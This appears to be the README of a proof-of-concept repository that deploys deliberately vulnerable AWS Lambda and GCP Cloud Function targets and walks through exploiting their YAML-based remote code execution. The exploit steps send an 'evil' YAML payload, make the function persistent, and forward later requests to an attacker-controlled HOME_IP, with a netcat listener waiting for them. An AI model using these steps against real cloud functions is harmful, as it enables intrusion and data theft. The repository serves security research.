# serverless_persistency_poc

Vulnerable AWS Lambda & GCP Cloud Function (RCE) and files needed for achieving persistency on them. 
Simplified deployment using terraform! 

**BEWARE** Although attached role should not give attacker any chances of privilege escalation, remember that they are vulnerable to RCE (Remote Code Execution)!

## Dependencies

* [Terraform CLI](https://learn.hashicorp.com/tutorials/terraform/install-cli)
* [AWS CLI](https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-install.html) & [configured](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html) for your account
* [Google Cloud SDK](https://cloud.google.com/sdk/docs/install) & [configured with application-default](https://cloud.google.com/sdk/gcloud/reference/auth/application-default) & configured project

## Deployment

### AWS Lambda:
```bash
cd serverless_persistency_poc/aws
# Verify variables.tf for used AWS region and AWS profile (using default)
terraform init
terraform apply -auto-approve

# To clean up and delete all of the created AWS resources
terraform destroy -auto-approve
```

### GCP Cloud Function:
```bash
cd serverless_persistency_poc/gcp
# Edit variables.tf with your Project-ID (gcloud projects list), verify region, remember to set gcloud auth application-default login
terraform init
terraform apply -auto-approve

# To clean up and delete all of the created AWS resources
terraform destroy -auto-approve
```

## Exploitation

All needed files are in *exploit_files* folder.

### AWS Lambda
```bash
cd serverless_persistency_poc/aws/exploit_files
# Test Lambda with safe YAML, LAMBDA_ADDR should be returned in Terraform output
./send_yaml.py <LAMBDA_ADDR> valid_test_yaml.yaml

# Edit evil_bootstrap.py HOME_IP variable to your server IP address
vim evil_bootstrap.py

# Create YAML file with payload
./create_evil_yaml.py switcher.py evil_bootstrap.py

# Send file with payload, remember to start listening on your server (for example: nc -lvp 8000)
./send_yaml.py <LAMBDA_ADDR> evil_yaml.yaml

# Send safe YAML, your server should obtain it
./send_yaml.py <LAMBDA_ADDR> valid_test_yaml.yaml
```

### GCP Cloud Function
```bash
cd serverless_persistency_poc/gcp/exploit_files
# Test Lambda with safe YAML, FUNCTION should be returned in Terraform output
./send_yaml.py <FUNCTION> valid_test_yaml.yaml

# Edit evil_function.py HOME_IP variable to your server IP address
vim evil_function.py

# Create YAML file with payload
./create_evil_yaml.py switcher.py evil_function.py

# Send file with payload, remember to start listening on your server (for example: nc -lvp 8000)
./send_yaml.py <FUNCTION> evil_yaml.yaml

# Send safe YAML, your server should obtain it
./send_yaml.py <FUNCTION> valid_test_yaml.yaml
```